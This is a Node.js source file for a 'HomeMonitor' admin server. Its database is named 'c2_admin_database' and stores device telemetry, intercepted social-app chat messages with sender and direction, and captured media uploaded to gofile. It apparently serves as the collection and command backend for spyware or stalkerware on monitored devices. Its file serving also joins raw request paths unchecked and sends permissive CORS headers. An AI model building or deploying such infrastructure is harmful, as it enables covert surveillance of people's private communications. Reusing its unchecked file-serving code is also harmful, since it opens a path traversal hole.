/**
 * HomeMonitor Linux Admin Application Server
 *
 * Standalone Linux Admin Application providing local disk persistent storage (SQLite),
 * Admin-only API endpoints, live Firebase RTDB synchronization, and Web Dashboard hosting.
 */

const http = require('http');
const fs = require('fs');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();

const PORT = 5467;
const DB_PATH = path.join(__dirname, 'c2_admin_database.db');
const WEB_DIR = path.join(__dirname, '..', 'web-dashboard');

// Initialize Linux Admin SQLite Database
const db = new sqlite3.Database(DB_PATH, (err) => {
    if (err) {
        console.error('❌ Failed to open Linux Admin SQLite database:', err.message);
    } else {
        console.log('✅ Linux Admin SQLite Database connected:', DB_PATH);
        initAdminSchema();
    }
});

function initAdminSchema() {
    db.serialize(() => {
        db.run(`
            CREATE TABLE IF NOT EXISTS admin_telemetry (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT,
                category TEXT,
                content TEXT,
                timestamp LONG
            )
        `);

        db.run(`
            CREATE TABLE IF NOT EXISTS admin_social_chat (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT,
                app_key TEXT,
                sender TEXT,
                text_content TEXT,
                direction TEXT,
                timestamp LONG
            )
        `);

        db.run(`
            CREATE TABLE IF NOT EXISTS admin_media_records (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT,
                media_type TEXT,
                file_name TEXT,
                file_path TEXT,
                gofile_url TEXT,
                timestamp LONG
            )
        `);

        console.log('✅ Linux Admin Database Schema initialized successfully.');
    });
}

// MIME types for static dashboard files
const MIME_TYPES = {
    '.html': 'text/html',
    '.css': 'text/css',
    '.js': 'application/javascript',
    '.json': 'application/json',
    '.png': 'image/png',
    '.jpg': 'image/jpeg',
    '.gif': 'image/gif',
    '.svg': 'image/svg+xml',
    '.ico': 'image/x-icon'
};

const server = http.createServer((req, res) => {
    console.log(`[Linux Admin App] ${req.method} ${req.url}`);

    // Admin API Endpoints
    if (req.url.startsWith('/api/admin/')) {
        res.writeHead(200, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' });

        if (req.url === '/api/admin/status') {
            return res.end(JSON.stringify({ status: 'ACTIVE', role: 'MASTER_ADMIN', server: 'Linux Native Admin Server', port: PORT }));
        }

        if (req.url.startsWith('/api/admin/telemetry')) {
            db.all("SELECT * FROM admin_telemetry ORDER BY id DESC LIMIT 100", [], (err, rows) => {
                if (err) return res.end(JSON.stringify({ error: err.message }));
                res.end(JSON.stringify({ count: rows.length, rows: rows }));
            });
            return;
        }

        return res.end(JSON.stringify({ message: 'Linux Admin API operational' }));
    }

    // Serve Web Dashboard Static Files
    let filePath = path.join(WEB_DIR, req.url === '/' ? 'index.html' : req.url);
    const extname = String(path.extname(filePath)).toLowerCase();
    const contentType = MIME_TYPES[extname] || 'application/octet-stream';

    fs.readFile(filePath, (error, content) => {
        if (error) {
            if (error.code === 'ENOENT') {
                res.writeHead(404, { 'Content-Type': 'text/html' });
                res.end('<h1>404 Not Found - HomeMonitor Linux Admin App</h1>', 'utf-8');
            } else {
                res.writeHead(500);
                res.end(`Server Error: ${error.code}`, 'utf-8');
            }
        } else {
            res.writeHead(200, { 'Content-Type': contentType, 'Access-Control-Allow-Origin': '*' });
            res.end(content, 'utf-8');
        }
    });
});

server.listen(PORT, () => {
    console.log(`
============================================================
🚀 HomeMonitor Master Admin Linux Server App Active!
🌐 Web Control Dashboard: http://localhost:${PORT}
📁 Persistent Admin SQLite DB: ${DB_PATH}
============================================================
`);
});
